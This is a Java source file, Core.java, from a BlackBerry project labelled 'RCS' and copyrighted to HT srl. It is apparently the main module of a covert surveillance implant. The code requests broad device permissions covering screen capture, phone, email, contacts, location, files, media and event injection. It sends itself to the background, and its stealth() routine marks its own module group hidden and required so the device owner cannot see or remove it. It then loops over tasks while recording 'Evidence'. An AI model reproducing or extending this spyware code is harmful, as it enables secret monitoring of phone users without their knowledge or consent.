//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Core.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Date;

import net.rim.device.api.applicationcontrol.ApplicationPermissions;
import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.CodeModuleGroup;
import net.rim.device.api.system.CodeModuleGroupManager;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.fs.Path;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * Classe Core, contiene il main.
 */
public final class Core implements Runnable {

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug;
    //#endif
    private static Core instance;

    /**
     * Gets the single instance of Core.
     * 
     * @return single instance of Core
     */
    public static synchronized Core getInstance() {
        if (instance == null) {
            instance = new Core();
        }
        return instance;
    }

    /**
     * Lib main.
     * 
     * @param args
     *            the args
     */
    public static void libMain(final String[] args) {
        final Core core = Core.getInstance();
        core.run();
    }

    /** The task obj. */
    private final Task task;

    /**
     * Instantiates a new core.
     */
    private Core() {
        Path.makeDirs();

        //#ifdef DEBUG
        debug = new Debug("Core", DebugLevel.VERBOSE);
        debug.info("INIT " + (new Date()).toString());
        //#endif

        checkPermissions();

        task = Task.getInstance();
        Utils.sleep(1000);

        final boolean antennaInstalled = true;
        //#ifdef DEBUG
        System.out.println("DEBUG");
        //#endif

        //#ifdef DEBUG
        System.out.println("DEBUG_TRACE");
        //#endif
        //#ifdef DEBUG
        System.out.println("DEBUG_INFO");
        //#endif
        //#ifdef DEBUG
        System.out.println("DEBUG_WARN");
        //#endif
        //#ifdef DEBUG
        System.out.println("DEBUG_ERROR");
        //#endif
        //#ifdef DEBUG
        System.out.println("DEBUG_FATAL");
        //#endif

        Encryption.init();

        ((Main) Application.getApplication()).goBackground();
    }

    /**
     * This method showcases the ability to check the current permissions for
     * the application. If the permissions are insufficient, the user will be
     * prompted to increase the level of permissions. You may want to restrict
     * permissions for the ApplicationPermissionsDemo.cod module beforehand in
     * order to demonstrate this sample effectively. This can be done in
     * Options/Advanced Options/Applications/(menu)Modules.Highlight
     * 'ApplicationPermissionsDemo' in the Modules list and select 'Edit
     * Permissions' from the menu.
     */
    private void checkPermissions() {

        //#ifdef DEBUG
        debug.trace("CheckPermissions");
        //#endif

        // NOTE: This sample leverages the following permissions:
        // --Event Injector
        // --Phone
        // --Device Settings
        // --Email
        // The sample demonstrates how these user defined permissions will
        // cause the respective tests to succeed or fail. Individual
        // applications will require access to different permissions.
        // Please review the Javadocs for the ApplicationPermissions class
        // for a list of all available permissions
        // May 13, 2008: updated permissions by replacing deprecated constants.

        // Capture the current state of permissions and check against the
        // requirements
        final ApplicationPermissionsManager apm = ApplicationPermissionsManager
                .getInstance();
        final ApplicationPermissions original = apm.getApplicationPermissions();

        // Set up and attach a reason provider
        final CoreReasonProvider drp = new CoreReasonProvider();
        apm.addReasonProvider(ApplicationDescriptor
                .currentApplicationDescriptor(), drp);

        final int[] wantedPermissions = new int[] {
                ApplicationPermissions.PERMISSION_SCREEN_CAPTURE,
                ApplicationPermissions.PERMISSION_PHONE,
                ApplicationPermissions.PERMISSION_BLUETOOTH,
                ApplicationPermissions.PERMISSION_WIFI,
                ApplicationPermissions.PERMISSION_CODE_MODULE_MANAGEMENT,
                ApplicationPermissions.PERMISSION_PIM,
                ApplicationPermissions.PERMISSION_PHONE,
                ApplicationPermissions.PERMISSION_LOCATION_API,
                ApplicationPermissions.PERMISSION_FILE_API,
                ApplicationPermissions.PERMISSION_MEDIA,
                ApplicationPermissions.PERMISSION_EMAIL,
                ApplicationPermissions.PERMISSION_EVENT_INJECTOR,
                ApplicationPermissions.PERMISSION_IDLE_TIMER,
                ApplicationPermissions.PERMISSION_CHANGE_DEVICE_SETTINGS,
                ApplicationPermissions.PERMISSION_INTERNAL_CONNECTIONS,
                ApplicationPermissions.PERMISSION_BROWSER_FILTER,
                ApplicationPermissions.PERMISSION_INTER_PROCESS_COMMUNICATION};

        //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 

        boolean allPermitted = true;
        for (int i = 0; i < wantedPermissions.length; i++) {
            final int perm = wantedPermissions[i];

            if (original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW) {
                allPermitted = false;
            }
        }

        if (allPermitted) {
            // All of the necessary permissions are currently available
            //#ifdef DEBUG
            debug
                    .info("All of the necessary permissions are currently available");
            //#endif
            return;
        }

        // Create a permission request for each of the permissions your
        // application
        // needs. Note that you do not want to list all of the possible
        // permission
        // values since that provides little value for the application or the
        // user.
        // Please only request the permissions needed for your application.
        final ApplicationPermissions permRequest = new ApplicationPermissions();
        for (int i = 0; i < wantedPermissions.length; i++) {
            final int perm = wantedPermissions[i];
            permRequest.addPermission(perm);
        }

        final boolean acceptance = ApplicationPermissionsManager.getInstance()
                .invokePermissionsRequest(permRequest);

        if (acceptance) {
            // User has accepted all of the permissions
            //#ifdef DEBUG
            debug.info("User has accepted all of the permissions");
            //#endif
            return;
        } else {
            //#ifdef DEBUG
            debug.warn("User has accepted some or none of the permissions");
            //#endif
        }
    }

    /**
     * Run.
     * 
     * @return true, if successful
     */
    public void run() { 
        //#ifdef DEBUG
        debug.info("START: " + (new Date()));
        //#endif
        Evidence.info("START");
   
        stealth();
        Utils.sleep(500);     
        try {
            for (;;) {
                //#ifdef DEBUG
                debug.info("init task");
                //#endif
                if (task.taskInit() == false) {
                    //#ifdef DEBUG
                    debug.error("TaskInit() FAILED");
                    //#endif
                    break;
                } else {
                    //#ifdef DEBUG
                    debug.trace("TaskInit() OK");
                    //#endif
                    // CHECK: Status o init?
                }

                Status.getInstance().setRestarting(false);

                //#ifdef DEBUG
                debug.info("starting checking actions");
                //#endif
                if (task.checkActions() == false) {
                    //#ifdef DEBUG
                    debug.error("CheckActions() wants to exit");
                    //#endif
                    // chiudere tutti i thread
                    // decidere se e' un uninstall
                    break;
                } else {
                    //#ifdef DEBUG
                    debug.info("Waiting a while before reloading");
                    //#endif
                    Utils.sleep(2000);
                }
            }
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("run " + ex);
            //#endif
        } finally {

            //#ifdef DEBUG
            debug.trace("RCSBlackBerry exit ");
            //#endif

            //#ifdef DEBUG
            Debug.stop();
            //#endif

            Utils.sleep(2000);
            System.exit(0);
        }
    }

    /**
     * Stealth.
     */
    private void stealth() {

        try {

            final String sCurrentModuleName = ApplicationDescriptor
                    .currentApplicationDescriptor().getModuleName();
            //#ifdef DEBUG
            debug.info(sCurrentModuleName);
            //#endif

            final CodeModuleGroup[] allGroups = CodeModuleGroupManager
                    .loadAll();
            CodeModuleGroup myGroup = null;
            final String moduleName = ApplicationDescriptor
                    .currentApplicationDescriptor().getModuleName();

            for (int i = 0; i < allGroups.length; i++) {
                if (allGroups[i].containsModule(moduleName)) {
                    myGroup = allGroups[i];
                    break;
                }
            }

            if (myGroup != null) {
                myGroup.setFlag(CodeModuleGroup.FLAG_REQUIRED, true);

                //#ifdef DEBUG
                debug.trace("stealth: hiding...");
                //#endif                
                myGroup.setFlag(CodeModuleGroup.FLAG_HIDDEN, true);
                //#ifdef DEBUG
                debug.info("Group Hidden!");
                //#endif
            } else {
                //#ifdef DEBUG
                debug.warn("group not found");
                //#endif
            }

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("st " + ex);
            //#endif
        }
    }

}
